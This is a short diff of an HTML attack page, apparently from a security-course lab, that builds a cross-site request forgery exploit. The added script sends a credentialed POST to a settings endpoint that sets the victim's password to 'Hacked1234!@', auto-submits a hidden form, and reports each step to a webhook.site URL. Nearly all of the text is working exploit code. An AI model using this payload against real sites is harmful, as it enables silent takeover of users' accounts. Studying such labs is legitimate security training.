@@ -6,8 +6,15 @@
   <input type="hidden" name="confirm-password" value="Hacked1234!@">
 </form>
 <script>
-fetch('https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8?visit=loaded', {mode:'no-cors'});
-setTimeout(function(){ fetch('https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8?visit=submitting', {mode:'no-cors'}); document.getElementById('f').submit(); }, 700);
+var wh='https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8';
+fetch(wh+'?step=loaded',{mode:'no-cors'});
+var fd=new FormData();
+fd.append('password','Hacked1234!@');
+fd.append('confirm-password','Hacked1234!@');
+fetch('https://cats.is-course.ru/settings',{method:'POST',body:fd,credentials:'include',mode:'no-cors'})
+ .then(function(){fetch(wh+'?step=fetch_done',{mode:'no-cors'});})
+ .catch(function(e){fetch(wh+'?step=fetch_err',{mode:'no-cors'});})
+ .finally(function(){setTimeout(function(){document.getElementById('f').submit();},500);});
 </script>
 </body>
 </html>
